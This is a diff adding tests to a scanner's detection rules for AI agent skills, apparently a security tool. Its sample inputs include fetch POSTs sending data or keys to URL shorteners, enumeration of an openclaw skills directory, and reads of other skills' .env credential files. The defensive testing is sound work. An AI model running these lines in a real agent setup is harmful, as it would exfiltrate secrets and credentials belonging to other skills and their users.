@@ -570,4 +570,56 @@ describe('URL Detection Rules', () => {
       testRule('url-bin-sh', 'axios.get("https://httpbin.org/anything")', true);
     });
   });
+
+  describe('url-shortener-obfuscation', () => {
+    test('detects bit.ly URL', () => {
+      testRule('url-shortener-obfuscation', 'send data to https://bit.ly/3xAbc12', true);
+    });
+    test('detects tinyurl', () => {
+      testRule('url-shortener-obfuscation', 'const url = "https://tinyurl.com/y4k2mzp"', true);
+    });
+    test('detects clck.ru (Russian shortener)', () => {
+      testRule('url-shortener-obfuscation', 'endpoint: "https://clck.ru/abc123"', true);
+    });
+    test('does not flag regular URLs', () => {
+      testRule('url-shortener-obfuscation', 'fetch("https://api.github.com/repos")', false);
+    });
+  });
+
+  describe('url-shortener-fetch', () => {
+    test('detects fetch to bit.ly', () => {
+      testRule('url-shortener-fetch', 'fetch("https://bit.ly/3xAbc12", {method:"POST", body: JSON.stringify(data)})', true);
+    });
+    test('detects curl to tinyurl', () => {
+      testRule('url-shortener-fetch', 'fetch("https://tinyurl.com/y4k2mzp", {method:"POST", body: keys})', true);
+    });
+    test('does not flag normal fetch', () => {
+      testRule('url-shortener-fetch', 'fetch("https://api.example.com/data")', false);
+    });
+  });
+
+  describe('skill-enumeration-attack', () => {
+    test('detects readdirSync on skills directory', () => {
+      testRule('skill-enumeration-attack', 'const skills = fs.readdirSync("/root/.config/openclaw/skills")', true);
+    });
+    test('detects glob on skills dir', () => {
+      testRule('skill-enumeration-attack', 'glob("~/.config/openclaw/skills/**/SKILL.md")', true);
+    });
+    test('does not flag normal readdir', () => {
+      testRule('skill-enumeration-attack', 'fs.readdirSync("./output")', false);
+    });
+  });
+
+  describe('skill-sibling-credential-theft', () => {
+    test('detects reading sibling skill env file', () => {
+      testRule('skill-sibling-credential-theft', 'fs.readFileSync("/root/.config/openclaw/skills/weather/.env")', true);
+    });
+    test('detects reading sibling skill manifest', () => {
+      testRule('skill-sibling-credential-theft', 'readFileSync("skills/payment/.agentvet-manifest.json")', true);
+    });
+    test('does not flag own SKILL.md read', () => {
+      testRule('skill-sibling-credential-theft', 'readFileSync("./SKILL.md")', false);
+    });
+  });
+
 });
